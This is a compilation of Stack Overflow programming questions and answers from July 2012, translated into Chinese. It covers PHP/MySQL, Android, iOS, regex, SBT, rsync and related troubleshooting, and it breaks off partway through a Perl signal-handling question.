# php - 如何从一个站点发送数据并在 php 中的另一个站点上接收它

> ID：11427553
> 
> 赞同：0
> 
> 时间：2012-07-11T07:21:12.710
> 
> 标签：php, curl, send, transfer

我在 wordpress 网站的 php 文件中的单个变量中有字符串格式的数据。我想通过不同服务器上的 php 文件获取该变量的值。

我想要一种方法将该变量发送到我在不同服务器上创建的接收 php 文件并在此处打印该值。

简而言之，例如让 mydomain1.com/send.php 中有数据需要存储或显示在 mydomain2.com/receive.php

但是，**不使用表单**。发送文件中没有 html 表单，我也不想要它，因为不应该进行重定向。只是在发送文件数据的函数执行上，只需要在接收端传输和显示。

（我尝试使用 cURL 找到解决方案。但是，在任何地方我都找到了发送数据的代码，但是接收数据呢，我如何捕获发送的数据并在接收端显示。）如果除了 cURL 或表单之外还有其他解决方案提交我将不胜感激。

请尽快帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T08:20:25.143

有很多方法可以做到这一点，一种方法是[SOAP](http://php.net/manual/en/book.soap.php)客户端/服务器解决方案..：

你基本上有2个php文件，server1上的一个文件可以说是client.php，而在另一台服务器上有一个名为server.php的文件，它将接收从服务器1上的client.php发送的所有数据......这里是一个简单的来源，您需要将脚本中的 URL 更改为您的服务器/客户端 URL，以便它工作..：

**客户端.php**

```
<?php
//This is the SOAP Client which will call a method on Server 2 with passing some data:
//uri is the location where client.php is located, and "location" is the exact location to the client, including the name "client.php"

$client=new SoapClient(NULL,array("uri"=>"http://localhost/test","location"=>"http://localhost/test/test.php"));
$message=$client->hello("Hello World");
echo($message);
?> 
```

**服务器.php**

```
<?php
//This is the SOAP Server
class server2{
    public function hello($data){
        return "I received following data: " . $data;
    }
}

//the URI here is the location where the server.php is located.
$settings = array("uri"=>"http://localhost/test/");
$s=new SoapServer(null,$settings);
$s->setClass("server2");
$s->handle();
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:28:00.600

这是一个教程：[http ://davidwalsh.name/execute-http-post-php-curl](http://davidwalsh.name/execute-http-post-php-curl)

基本上你可以使用发送 urlencoded 值`CURLOPT_POSTFIELDS`

# android - 如何在 SBT/Android 插件/项目中更改 Scala 版本？

> ID：11427558
> 
> 赞同：2
> 
> 时间：2012-07-11T07:21:28.313
> 
> 标签：android, scala, sbt, scala-2.10, sbt-android-plugin

我正在使用带有 jberkel/android-plugin 的 SBT v0.13，我正在尝试对其进行修改。

为此，我需要在我的测试项目中 使用[Scala 2.10.0-20120710-144914-026a70d555 。](http://www.scala-lang.org/archives/downloads/distrib/files/nightly/distributions/scala-2.10.0-latest.zip)

到目前为止，我使用的是Scala 2.9.1，现在需要切换到2.10.0-20120710-144914-026a70d555，但是我对这些东西不是很熟练。

我遇到了这个[问题](https://stackoverflow.com/questions/2888031/changing-scala-version-in-existing-sbt-project)，但这对我不起作用。

当我尝试编译测试应用程序并将其推送到设备时，我得到以下输出：

```
[info] Wrote C:\Users\Administrator\myProject\target\scala-2.10.0-20120710-144914-026a70d555\src_managed\main\scala\com\google\summer\TR.scala  
[info] Updating {file:/C:/Users/Administrator/myProject/}My Project...  
[info] Resolving org.scala-lang#scala-library;2.10.0-20120710-144914-026a70d555 ...  
[warn]  module not found: org.scala-lang#scala-library;2.10.0-20120710-144914-026a70d555  
[warn] ==== local: tried  
[warn]   C:\Users\Administrator\.ivy2/local/org.scala-lang/scala-library/2.10.0-20120710-144914-026a70d555/ivys/ivy.xml  
[warn] ==== public: tried  
[warn]   http://repo1.maven.org/maven2/org/scala-lang/scala-library/2.10.0-20120710-144914-026a70d555/scala-library-2.10.0-20120710-144914-026a70d555.pom  
[info] Resolving org.scalatest#scalatest_2.10.0-20120710-144914-026a70d555;1.8.RC1 ...  
[warn]  module not found: org.scalatest#scalatest_2.10.0-20120710-144914-026a70d555;1.8.RC1  
[warn] ==== local: tried  
[warn]   C:\Users\Administrator\.ivy2/local/org.scalatest/scalatest_2.10.0-20120710-144914-026a70d555/1.8.RC1/ivys/ivy.xml  
[warn] ==== public: tried  
[warn]   http://repo1.maven.org/maven2/org/scalatest/scalatest_2.10.0-20120710-144914-026a70d555/1.8.RC1/scalatest_2.10.0-20120710-144914-026a70d555-1.8.RC1.pom  
[warn]  ::::::::::::::::::::::::::::::::::::::::::::::  
[warn]  ::          UNRESOLVED DEPENDENCIES         ::  
[warn]  ::::::::::::::::::::::::::::::::::::::::::::::  
[warn]  :: org.scala-lang#scala-library;2.10.0-20120710-144914-026a70d555: not found  
[warn]  :: org.scalatest#scalatest_2.10.0-20120710-144914-026a70d555;1.8.RC1: not found  
[warn]  ::::::::::::::::::::::::::::::::::::::::::::::  
[error] {file:/C:/Users/Administrator/myProject/}My Project/*:update: sbt.ResolveException: unresolved dependency: org.scala-lang#scala-library;2.10.0-20120710-144914-026a70d555: not found  
[error] unresolved dependency: org.scalatest#scalatest_2.10.0-20120710-144914-026a70d555;1.8.RC1: not found  
[error] Total time: 1 s, completed 11.07.2012\. 08:55:13 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-11T10:18:49.900

我想你需要

> 设置 scalaVersion := "2.10.0-SNAPSHOT"

它将自动选择最新发布的 scala 版本。

# regex - Visual Studio 在字符类中查找并替换右方括号 ]

> ID：11427563
> 
> 赞同：9
> 
> 时间：2012-07-11T07:21:59.077
> 
> 标签：regex, visual-studio-2010

我想制作一个否定字符类来匹配像这样的*方括号标签 [方括号标签]*。问题是，] 字符结束了字符类！

我试过

```
\[[^\]]+] 
```

但是当我运行它时出现语法错误。（这是在查找和替换正则表达式引擎中，它与标准 .NET 引擎仅供参考）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T07:25:12.010

您忘记转义最后的结束括号：

```
\[[^\]]+\] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:32:42.160

[msdn](http://msdn.microsoft.com/en-us/library/hs600312.aspx)中的第一个示例用于`\\`转义`\`然后转义`.`. 所以你应该像`\\[[^\\]]+\\]`Damien_The_Unbeliever 所说的那样做一些事情，你还没有结束最后的括号。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2019-01-02T09:40:42.557

我绝对希望用“\”转义，但它对我不起作用（grep@MacOS），但这个： `[^]]` 完成了工作。只需将 ] 作为类中的第一个字符。我实际上使用了类似的东西： `[^]?[]`

# java - 从 Web 服务收到的响应为空

> ID：11427566
> 
> 赞同：2
> 
> 时间：2012-07-11T07:22:05.760
> 
> 标签：java, android, eclipse, web-services, ksoap2

我正在使用使用 KSOAP 的 Web 服务发送要存储在数据库中的详细信息。我已经使用 Visual Studio 来创建 Web 服务。网络服务工作正常。将详细信息插入数据库后，将返回一个字符串。问题是这个字符串是空的，也许我得到响应的方式有问题。很长一段时间以来，我一直试图找出问题所在。请帮忙

```
public class Registration extends Activity{
private static final String SOAP_ACTION = "http://tempuri.org/register";
private static final String OPERATION_NAME = "register";
private static final String WSDL_TARGET_NAMESPACE = "http://tempuri.org/";
private static final String SOAP_ADDRESS = "http://10.0.2.2:58076/WebSite1/Service.asmx";
Button sqlRegister, sqlView;

EditText  sqlFirstName,sqlLastName,sqlEmail,sqlMobileNumber,sqlCurrentLocation,sqlUsername,sqlPassword;

@Override
protected void onCreate(Bundle savedInstanceState){
super.onCreate(savedInstanceState);
setContentView(R.layout.registration);
sqlFirstName = (EditText) findViewById(R.id.etFname);
sqlLastName = (EditText) findViewById(R.id.etLname);
sqlEmail = (EditText) findViewById(R.id.etEmail);
sqlMobileNumber = (EditText) findViewById(R.id.etPhone);
sqlCurrentLocation = (EditText) findViewById(R.id.etCurrentLoc);

sqlUsername = (EditText) findViewById(R.id.etUsername);
sqlPassword = (EditText) findViewById(R.id.etPwd);

sqlRegister = (Button) findViewById(R.id.bRegister);
sqlRegister.setOnClickListener(new View.OnClickListener() {

    public void onClick(View v) {
        switch (v.getId()){
        case R.id.bRegister:
        new LongOperation().execute("");
        break;
      }
     }
    });
}

private class LongOperation extends AsyncTask<String, Void, String> {

    @Override
    protected String doInBackground(String... params) {
         String firstname = sqlFirstName.getText().toString();
         String lastname = sqlLastName.getText().toString();
         String emailadd = sqlEmail.getText().toString();
         String number = sqlMobileNumber.getText().toString();
         String loc = sqlCurrentLocation.getText().toString();
         String uname = sqlUsername.getText().toString();
         String pwd = sqlPassword.getText().toString();

         SoapObject Request = new SoapObject(WSDL_TARGET_NAMESPACE,OPERATION_NAME);
         Request.addProperty("fname", String.valueOf(firstname));
         Request.addProperty("lname", String.valueOf(lastname));
         Request.addProperty("email", String.valueOf(emailadd));
         Request.addProperty("num", String.valueOf(number));
         Request.addProperty("loc", String.valueOf(loc));
         Request.addProperty("username", String.valueOf(uname));
         Request.addProperty("password", String.valueOf(pwd));

         SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
         envelope.dotNet = true;
         envelope.setOutputSoapObject(Request);
         HttpTransportSE httpTransport  = new HttpTransportSE(SOAP_ADDRESS);
         Log.d("work","work");
         try
         {
            httpTransport.call(SOAP_ACTION, envelope);
             SoapObject response = (SoapObject)envelope.getResponse();
             String result =  response.getProperty(0).toString();
             Log.d("res",result);
             if(result.equals("reg"))
             {
                 Log.d("reg","reg");
                 return "Registered";
             }
             else
             {
                 Log.d("no","no");
                 return "Not Registered";
             }
         }catch(Exception e){
            e.printStackTrace();
        }
         return null;

    }      

    @Override
    protected void onPostExecute(String result) {
        Log.d("tag","onpost");
        if(result!=null)
        {

            if(result.equals("Registered"))
                {
                    Toast.makeText(Registration.this, "You have been registered Successfully", Toast.LENGTH_LONG).show();
                }
            else if(result.equals("Not Registered"))
                {
                    Toast.makeText(Registration.this, "Try Again", Toast.LENGTH_LONG).show();
                }
        }
        else
        {
            Toast.makeText(Registration.this, "Somethings wrong", Toast.LENGTH_LONG).show(); ///This is what gets printed on screen
        }
    }

    @Override
    protected void onPreExecute() {
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }

    }   
  } 
```

![在此处输入图像描述](../Images/14eb78c42bdb164b04f170c7053207db.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T08:27:45.363

您的网络服务正在返回一个`String`. 尝试使用它来解决您的问题

```
 Object result = envelope.getResponse(); 
```

当您的网络服务返回 byte[] 类型的值时，您可以这样做：

```
 SoapObject response=(SoapObject)envelope.bodyIn; 
```

希望能帮助到你

# php - php/mysql 统计搜索词和关键字限制的结果

> ID：11427569
> 
> 赞同：0
> 
> 时间：2012-07-11T07:22:14.240
> 
> 标签：php, mysql, search, count

我有以下 PHP 搜索脚本。
当我搜索时`1234567`，它匹配确切的短语，但我希望它只匹配最初的 4 个字符，即`1234`.

**解释：**

我希望它计算最初的 4 个字符并显示与这些初始字符匹配的结果。例如，如果有人搜索，`1234567`那么脚本应该计算最初的 4 个字符`1234`，即显示结果。同样，如果有人搜索`456789`，那么脚本应该计算最初的 4 个字符`4567`，即显示结果。

```
///explode search term
           $search_exploded = explode(" ",$search);
           foreach($search_exploded as  $search_each)
           {
           //construct query

            $x++;
            if ($x==1)
               $construct .= "keywords LIKE '%$search_each%'";
           else
              $construct .= " OR keywords LIKE '%$search_each%'";

           }

     //echo out construct

    $construct = "SELECT * FROM numbers WHERE $construct";
     $run = mysql_query($construct);

     $foundnum = mysql_num_rows($run);

     if ($foundnum==0)
        echo "No results found.";
     {

       echo "$foundnum results found.<p><hr size='1'>";

       while ($runrows = mysql_fetch_assoc($run))
       {
        //get data
        $title = $runrows['title']; 
        $desc = $runrows['description'];
       $url = $runrows['url'];

        echo "<b>$title</b>
             <b>$desc</b>
       <a href='$url'>$url</a><p>"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:53:21.707

您可以将您的替换`foreach`为：

```
foreach($search_exploded as $search_each)
{
    $str = mysql_real_escape_string(substr($search_each, 0, 4));
    //construct query
    $x++;
    if ($x==1) $construct .= "keywords LIKE '$str%'";
    else       $construct .= " OR keywords LIKE '$str%'";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:27:58.783

要将现有代码修改为仅使用前 4 个单词，您只需稍微更改循环：

改变这个——

```
foreach($search_exploded as $search_each) { 
```

对此——

```
for($i = 0; $i < min(count($search_exploded), 4); ++$i) {
    $search_each = $search_exploded[$i]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:44:42.597

将以下代码添加到`foreach`循环顶部：

```
if(strlen($search_each) > 4) $search_each = substr($search_each, 0, 4); 
```

* * *

像这样：

```
$search_exploded = explode(" ", $search);
foreach($search_exploded as $search_each)
{
    if(strlen($search_each) > 4) $search_each = substr($search_each, 0, 4);
    // your code
} 
```

如果单词长于 4，此代码将搜索每个单词中的前 4 个字符。

# c# - 是否可以使用 SignalR 创建简单的 REST 服务？

> ID：11427573
> 
> 赞同：1
> 
> 时间：2012-07-11T07:22:25.937
> 
> 标签：c#, .net, rest, service, signalr

我最近发现了 SignalR，似乎它可以适应具有数百个并发连接的高负载项目。

但据我所知，它只支持全通信类型的软件（实时）。

那么问题来了：是否可以在**没有客户端代码和持久连接的情况下使用 SignalR 创建 REST 服务？**

基本上，我只需要 SignalR 和 HTTP 请求处理程序（如果存在）中的**异步高性能**服务器端部分。

问候。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-23T01:06:39.607

不，这不是 SignalR 的目的，如果你想制作一个流式 restful api，请使用 WebApi。看看推送内容[http://blogs.msdn.com/b/henrikn/archive/2012/04/23/using-cookies-with-asp-net-web-api.aspx](http://blogs.msdn.com/b/henrikn/archive/2012/04/23/using-cookies-with-asp-net-web-api.aspx)。

# iphone - 以编程方式在 iPhone 中添加 100 条短信

> ID：11427575
> 
> 赞同：-2
> 
> 时间：2012-07-11T07:22:34.970
> 
> 标签：iphone, sms

我想以编程方式在我的 iPhone 中添加 100 条短信。有谁知道该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-17T09:54:37.303

我相信您可以使用基于 Web 的 SMS API 服务。以[Twilio](http://www.twilio.com/)为例。此外，[One API Gateway](http://oneapi-gw.gsma.com/)目前已在加拿大推出，并将很快扩展到其他市场

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:54:54.647

您可以使用[`MFMessageComposeViewController`](http://developer.apple.com/library/ios/#DOCUMENTATION/MessageUI/Reference/MFMessageComposeViewController_class/Reference/Reference.html)向用户呈现一个填充了文本和数字的 viewController。但是你不能自动发送短信。

# linux - Rsync：排除所有文件但没有目录

> ID：11427578
> 
> 赞同：1
> 
> 时间：2012-07-11T07:22:40.590
> 
> 标签：linux, backup, rsync

我想**定义一个 rsync 包含/排除规则，它排除目录中的所有文件，但包含里面的所有子目录，而这些目录中没有任何文件**。

为什么要这样做？

我正在使用**rsync 来备份**某些 Linux/Unix**系统**，如果我恢复其中一个备份，则如果**没有适当的目录，系统将无法使用**。

/var/log 就是一个很好的例子。显然我不想在备份中包含任何日志文件。尽管如此，我需要/var/log 下的目录，例如/var/log/apache2 存在，否则我的服务（在这种情况下为apache2）之后将无法启动。

有可能做到，我只用特制的 rsync 排除/包含规则做了一次，但现在我不记得了，因为我在 StackOverflow 上找到的 rsync 问题都没有真正提供适当的解决方案，但我认为它不会在这里提出这个问题并没有什么坏处。

# ios - Objective-C：如何将字符串传递给 .xib 文件并显示 MapView？

> ID：11427580
> 
> 赞同：1
> 
> 时间：2012-07-11T07:22:41.290
> 
> 标签：ios, objective-c, mkmapview

我有一个 .xib 文件，用户可以在其中输入 UITextField 中某个地点的位置名称，然后单击搜索。然后将加载另一个 .xib 文件，用户将在其中看到带有地图位置的 MapView 对象。

我制作了一个自定义的 init 方法，当用户单击按钮时，我按如下方式传递字符串：

```
AddLocViewController *locView = [[AddLocViewController alloc] initWithNibName:nil bundle:nil customLoc:textLoc.text];
[self presentModalViewController:locView animated:YES]; 
```

在名为 AddLocViewController.m 的新 ViewController 类中，init 方法和 viewDidLoad 如下：

```
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil customLoc:(NSString*)_loc
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) 
    {
        stringLoc1 = _loc;
    }
    return self;
}

- (void)viewDidLoad
{
    [super viewDidLoad];    
    [self showAddress];
} 
```

这里 [self showAddress] 调用一个方法来显示 mapView 对象上的内容，如果我有一个 UITextField 接受输入并单击一个按钮将值设置为 NSString 对象 stringLoc 并在 showAddress 方法中使用它，那么 showAddress 方法可以完美地工作：

```
- (void) showAddress
{
    MKCoordinateRegion region;
MKCoordinateSpan span;

span.latitudeDelta=0.01f;
span.longitudeDelta=0.01f;

    stringLoc1 = [NSString stringWithFormat:@"http://maps.google.com/maps/geo?q=%@&output=csv", 
                       [addressField.text stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];

    NSString *locationString = [NSString stringWithContentsOfURL:[NSURL URLWithString:stringLoc1]];
NSArray *listItems = [locationString componentsSeparatedByString:@","];

double aLatitude = 0.0;
double aLongitude = 0.0;

if([listItems count] >= 4 && [[listItems objectAtIndex:0] isEqualToString:@"200"]) {
    aLatitude = [[listItems objectAtIndex:2] doubleValue];
    aLongitude = [[listItems objectAtIndex:3] doubleValue];
}
else {
    [addressField setText: @"Address Location error"];
    return;
}

[addressField resignFirstResponder];

CLLocationCoordinate2D location = {latitude: aLatitude, longitude:aLongitude};

region.span=span;
region.center.latitude = aLatitude;
    region.center.longitude = aLongitude;

    if(addAnnotation != nil) {
    [mapView removeAnnotation:addAnnotation];
    //[addAnnotation release];
    addAnnotation = nil;
}

    addAnnotation = [[AddressAnnotation alloc] initWithCoordinate:location];
    [mapView addAnnotation: addAnnotation];

[mapView setRegion:region animated:TRUE];
[mapView regionThatFits:region];
} 
```

请帮助我将此处的参数传递给此类并适当地使用 showAddress 方法，因为它现在仅在从类中搜索位置时显示正确的位置，并且在实例化时不显示正确的位置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:46:29.630

在这里，您使用地址字段的内容覆盖 stringLoc1：无论其初始值如何，它都会被覆盖。如果 textField 为空，则它被空字符串覆盖。

```
stringLoc1 = [NSString stringWithFormat:@"http://maps.google.com/maps/geo?q=%@&output=csv", 
                       [addressField.text stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]]; 
```

我不确定在剩余代码的上下文中最好的解决方案是什么。但这应该有效：

```
NSString *currentLoc;

if (addressField.text && ([addressField.text length] == 0)) {
  currentLoc = addressFiled.text;
  stringLoc1 = addressField.text; // this line will set the current value as default value for the next call of the method; unless a new init call comes in between.
}
else
  currentLoc = stringLoc1; 

    currentLoc = [NSString stringWithFormat:@"http://maps.google.com/maps/geo?q=%@&output=csv", 
                           [currentLoc  stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];

NSString *locationString = [NSString stringWithContentsOfURL:[NSURL URLWithString:currentLoc ]]; 
```

我相信有更聪明的方法可以做到这一点。但这应该对您与我们共享的代码视图行进行最小的更改。

# php - 读写mysql

> ID：11427585
> 
> 赞同：0
> 
> 时间：2012-07-11T07:22:55.730
> 
> 标签：php, mysql, database

我第一次做 PHP/mySQL 程序，可能需要一些建议。

我要创建的程序将按如下方式工作......如果出现问题，它将是您发​​送到服务器的表单。您希望能够自己填写表格。然后问题将显示在另一台计算机上。

我想我需要写入一个 mySQL 数据库，然后在将它们连接到我的数据库后从下一个计算机读取它。但是我如何以最好的方式做到这一点？

我已经成功下载了 XAMPP 并在 mySQL 中创建了一个表。还有我输入信息的字段和提交按钮。

我在以下位置收到错误：

```
$operationstep = $_POST['Operation step'];
$problem_detail = $_POST['Problem detail']; 
```

> 注意：未定义索引：第 21 行 E:\xampp\htdocs\avvikelse.php 中的操作步骤
> 
> 注意：未定义索引：第 22 行 E:\xampp\htdocs\avvikelse.php 中的问题详细信息
> 
> 注意：未定义变量：第 25 行 E:\xampp\htdocs\avvikelse.php 中的 operation_step 错误：您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册以获取正确的语法，以便在第 1 行的“步骤，问题详细信息）VALUES ('', '',' 附近使用

```
// blabla, connetcting...

$operationstep = $_POST['Operation step'];
$problem_detail = $_POST['Problem detail'];

$sql = "INSERT INTO avvikelsekort (Operation step, Problem detail) VALUES
('$operation_step', '$problem_detail')";

if (!mysql_query($sql)) {
        die('Error: ' .mysql_error());
}

mysql_close();
?> 
```

我现在按照你所说的做了 Marco，我得到了 Array(0) {} 我的表单看起来像这样

```
 <form action="avvikelse.php" method="POST" />
    <p>Operation step: <input type="text" name"Operation step" /></p>
    <p>Problem detail: <input type="text" name"Problem detail" /></p>    
    <input type="submit" value="Submit" />
    </form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:25:14.673

如果您在字段名称中使用空格，则必须使用反引号。
更多，如果你调用变量

```
$operationstep = $_POST['Operation step'];
$problem_detail = $_POST['Problem detail']; 
```

你的查询应该是

```
$sql = "INSERT INTO avvikelsekort (`Operation step`, `Problem detail`) VALUES
    ('$operationstep', '$problem_detail')"; 
```

而且，最后但并非最不重要的一点是，请记住您**必须始终清理用户输入**以避免 sql 注入！

**已编辑**：
您的表格是错误的。尝试这个：

```
<form action="avvikelse.php" method="POST" />
    <p>Operation step: <input type="text" name="Operation step" /></p>
    <p>Problem detail: <input type="text" name="Problem detail" /></p>    
    <input type="submit" value="Submit" />
</form> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:26:30.780

您的帖子/获取名称中不能有空格：

```
$operationstep = $_POST['Operation step'];
$problem_detail = $_POST['Problem detail']; 
```

尝试

```
$operationstep = $_POST['Operation_step'];
$problem_detail = $_POST['Problem_detail']; 
```

或在表格中重命名它们。

还：

```
$operationstep = $_POST['Operation step'];
$problem_detail = $_POST['Problem detail']; 
```

与您正在执行的插入不匹配 - 请注意您在插入中使用的变量名称以及应如何引用带空格的列名：

```
$sql = "INSERT INTO avvikelsekort (`Operation step`, `Problem detail`) VALUES
('$operation_step', '$problem_detail')"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:43:46.780

正如其他人所回答的那样，由于`$_POST`数组中不存在该值，您将收到一条未定义的索引消息。

我建议您在将`$_POST`数据放入变量之前对数据进行清理，因为任何发布的数据都可能包含某种形式的恶意数据，这些数据可能导致 SQL 注入攻击。您可以在以下位置查看其他安全开发实践：[https ://www.owasp.org/index.php/OWASP_Guide_Project](https://www.owasp.org/index.php/OWASP_Guide_Project)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:29:58.737

您会注意到未定义的索引，因为该索引不存在于`$_POST`变量中。不要在索引中使用空格。编辑您的表单并在输入字段的名称属性中使用下划线，并`$operation_step`在查询中使用，`$operationstep`同时分配。并在查询中使用反引号作为表名。

# android - 在同一个 Activity 中使用不同的布局

> ID：11427586
> 
> 赞同：0
> 
> 时间：2012-07-11T07:22:56.927
> 
> 标签：android, nullpointerexception

我有一个`Activity`我使用两种布局。在这两种布局中，我有不同的`Buttons`. 从`Layout`我第一次调用该函数到第二次`Layout`，它都可以工作。`Button`但是，当我在第二个的下一个调用第一个方法时`Layout`，应用力关闭。

这是显示错误的代码：

```
Button.OnClickListener myOptionOnClickListener1 = new Button.OnClickListener() {
    public void onClick(View v1) {
        switch (v1.getId()) {
            case R.id.next:
                x++;
                Toast.makeText(getBaseContext(), "is" + x, Toast.LENGTH_SHORT).show();
                setonListener();
                break;
            case R.id.exit:
                finish();
                break;
        }
    }
};

// this code properly works.

Button.OnClickListener myOptionOnClickListener = new Button.OnClickListener() {
    public void onClick(View v) {
        if (x < 5) {
            setonListener();
        } else {
            nextonListener();
        }
    }
}; 
```

我得到的错误是：

```
07-11 12:42:55.001: E/AndroidRuntime(24227): java.lang.NullPointerException

07-11 12:42:55.001: E/AndroidRuntime(24227):    at com.infoways.quizcash.levelnxt.setonListener(levelnxt.java:81)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at com.infoways.quizcash.levelnxt$2.onClick(levelnxt.java:165)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at android.view.View.performClick(View.java:2532)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at android.view.View$PerformClick.run(View.java:9293)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at enter code hereandroid.os.Handler.handleCallback(Handler.java:587)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at android.os.Handler.dispatchMessage(Handler.java:92)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at android.os.Looper.loop(Looper.java:143)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at android.app.ActivityThread.main(ActivityThread.java:4277)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at java.lang.reflect.Method.invokeNative(Native Method)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at java.lang.reflect.Method.invoke(Method.java:507)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
07-11 12:42:55.001: E/AndroidRuntime(24227):    at dalvik.system.NativeStart.main(Native Method) 
```

我无法解决问题。这是 和 的`setonListener`代码`nextonListener`。`setonListener`第一次正常工作，但是当我从按钮调用它时出现问题。

```
public void setonListener()
{
    URL = "http://contest_id=100&game_id=1level="+count;
    //Toast.makeText(getBaseContext(), URL, Toast.LENGTH_SHORT).show();
    String xml = parser.getXmlFromUrl(URL); // getting XML
    Document doc = parser.getDomElement(xml); // getting DOM element
    final NodeList nl = doc.getElementsByTagName(KEY_QUESTION);

    // looping through all item nodes <item>s
    for(int j=0;j<nl.getLength();j++)
    {
        Element e = (Element) nl.item(j);
        listnew[j]=parser.getValue(e,KEY_QUEST); 
        options1[j]= parser.getValue(e, KEY_CHOICE1);
        options2[j]= parser.getValue(e, KEY_CHOICE2);
        options3[j]= parser.getValue(e, KEY_CHOICE3);
    }

    TextView question = (TextView)findViewById(R.id.question);
    question.setText(listnew[x]);

    opt1 = (Button)findViewById(R.id.opt1);
    opt1.setText(options1[x]);
    opt1.setOnClickListener(myOptionOnClickListener);

    opt2 = (Button)findViewById(R.id.opt2);
    opt2.setText(options2[x]);
    opt2.setOnClickListener(myOptionOnClickListener);

    opt3 = (Button)findViewById(R.id.opt3);
    opt3.setText(options3[x]);
    opt3.setOnClickListener(myOptionOnClickListener);

    x++; 
}; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:30:17.457

似乎错误出现在您的`setonListener()`方法中。也许您在执行之前使某些内容为空。`setonListener`在第 81 行调试你的和断点。如果问题仍然存在，请发布更多代码。

# c++ - 在 vs2008 中升级后检测到堆损坏

> ID：11427587
> 
> 赞同：0
> 
> 时间：2012-07-11T07:22:57.497
> 
> 标签：c++, visual-studio-2008, visual-c++, dll

我有一个在 vc++ 6 中构建的项目。现在我升级它 vs2008 并且它现在构建完美但是当我从调试文件夹打开它时它也打开但不执行，因为相关的 dll 不存在。

现在我复制了另一个文件夹中的 exe 和相关的 dll 并尝试在弹出框打开时打开它。![在此处输入图像描述](../Images/65e781301a6fc8bb17a98564f413833d.png)

现在我脑子里有两个问题-

1.  是否有任何文件损坏。
2.  我的 dll 是在 vc++6 环境中构建的。我是否也应该升级 dll。

并且可能还有另一个问题。请建议！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T08:12:46.507

*   在 Visual C++ 2008 中构建所有项目和解决方案，并小心**删除**所有更高级别的**警告**（至少 1 级和 2 级）。
*   从调试器运行程序（在调试模式下 - 即`F5`，而不是`Ctrl`+ `F5`）
*   仅运行调试构建。那也只有 32 位，您可以在其中编辑并继续。为此，您必须启用`/DEBUG`链接器选项
*   尝试缩小问题的范围。进行逐步调试，看看它在哪里失败。如果它断言，它是*好的*，不是坏的！查看调用堆栈并找到原因。
*   不要忽略异常，或将它们隐藏到 try-catch 块中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-26T05:58:20.200

遵守规则：内存应该在同一个模块中分配和释放。即，不要在 dll 中分配并在 exe 中释放，反之亦然。

您应该检查您的项目正在使用哪个 crt。不同的CRT分配内存的方式不同，在进行的过程中还会做很多额外的工作。

请参阅：（[静态链接的）DLL 是否使用与主程序不同的堆？](https://stackoverflow.com/questions/10820114/do-statically-linked-dlls-use-a-different-heap-than-the-main-program/10820518#10820518)

也许你应该最终重建你的代码。

# inheritance - 从虚拟类和非虚拟类继承

> ID：11427588
> 
> 赞同：0
> 
> 时间：2012-07-11T07:23:25.533
> 
> 标签：inheritance, polymorphism

矩形类：公共虚拟形状

矩形类：公共形状

这两个继承自Shape的类有什么区别？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:27:21.317

如果只停留在这两个类`Rectangle`和`Shape`. [虚拟继承](http://www.cprogramming.com/tutorial/virtual_inheritance.html)有助于解决[钻石问题](http://en.wikipedia.org/wiki/Diamond_problem)。

# perl - 从独立的 perl 进程向 perl 进程发出信号以触发处理程序中的代码

> ID：11427591
> 
> 赞同：1
> 
> 时间：2012-07-11T07:23:33.730
> 
> 标签：perl, winapi, process, signals

我在 Windows 上使用 perl v14。我有 2 个简单的文件：

```
$SIG{'INT'} = sub {
                print "got SIGINT\n";
                                    #some useful code to be executed
                                    #on reception of signal
};

$SIG{'ALRM'} = sub {
                print "got SIGALRM\n";
};
print "my pid: ",$$,"\n";
while(1)
{
    print "part 1\n";
    sleep(3);
    print "part 2\n\n";
    sleep(3);
} 
```

上面的文件在给出它的 pid 后启动并等待被杀死。第二个文件只是使用它的 pid（手动设置）杀死第一个 perl 进程。

```
